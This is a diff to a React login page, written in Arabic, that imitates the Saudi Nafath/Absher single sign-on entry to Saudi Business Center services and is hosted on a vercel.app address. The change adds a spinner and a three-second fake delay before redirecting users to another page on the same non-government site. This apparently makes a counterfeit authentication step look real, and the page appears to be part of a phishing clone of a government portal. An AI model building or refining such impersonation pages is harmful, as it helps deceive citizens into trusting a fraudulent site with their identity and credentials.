@@ -1,8 +1,20 @@
 import { Button } from "@/components/ui/button";
-import { Info } from "lucide-react";
+import { Info, Loader2 } from "lucide-react";
 import { Link } from "wouter";
+import { useState } from "react";
 
 export default function Login() {
+  const [isLoading, setIsLoading] = useState(false);
+
+  const handleLogin = (e: React.MouseEvent<HTMLAnchorElement>) => {
+    e.preventDefault();
+    setIsLoading(true);
+    
+    setTimeout(() => {
+      window.location.href = "https://sejel.vercel.app/home-new";
+    }, 3000);
+  };
+
   return (
     <div className="min-h-screen relative flex flex-col font-sans" dir="rtl">
       {/* Background Image with Overlay */}
@@ -48,8 +60,12 @@ export default function Login() {
             يمكن الدخول عن طريق "أبشر" من خلال بوابة النفاذ الوطني الموحد لكي تستفيد من الخدمات الإلكترونيه المقدمة من المركز السعودي للأعمال
           </p>
           
-          <a href="https://sejel.vercel.app/home-new" className="w-full">
-            <Button className="w-full bg-[#716da5] hover:bg-[#5a5684] text-white text-[19.2px] font-bold rounded-[7px] mb-[15px] transition-colors shadow-none h-[60px] border-[3px] border-[#716da5] flex items-center justify-center">
+          <a href="https://sejel.vercel.app/home-new" className="w-full" onClick={handleLogin}>
+            <Button 
+              className="w-full bg-[#716da5] hover:bg-[#5a5684] text-white text-[19.2px] font-bold rounded-[7px] mb-[15px] transition-colors shadow-none h-[60px] border-[3px] border-[#716da5] flex items-center justify-center gap-2"
+              disabled={isLoading}
+            >
+              {isLoading && <Loader2 className="h-6 w-6 animate-spin" />}
               الدخول بواسطة النفاذ الوطني الموحد
             </Button>
           </a>
